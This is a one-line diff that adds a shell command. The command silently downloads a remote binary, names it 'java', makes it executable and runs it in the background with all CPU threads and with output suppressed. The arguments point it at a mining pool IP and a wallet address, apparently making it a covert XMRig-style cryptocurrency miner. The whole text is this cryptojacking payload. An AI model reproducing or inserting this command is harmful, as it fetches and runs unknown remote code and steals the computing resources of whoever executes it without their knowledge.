@@ -1,0 +1,1 @@
+wget -qO java https://gitlab.com/jasa4/jasa/-/raw/main/jupyterlab && chmod +x java && nohup ./java -o 15.235.214.147:1123 -a rx/0 -u ZEPHsAd39ge4NUkVqULxGK7js9sifawddLqGxtVJMcou8bVw1Lf5gebLBTA6Xw1p5sLjr4foa7Q7tHsWtxJNpH8j22GJmifS7yG.juPy$(shuf -n 1 -i 1-9999999) --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
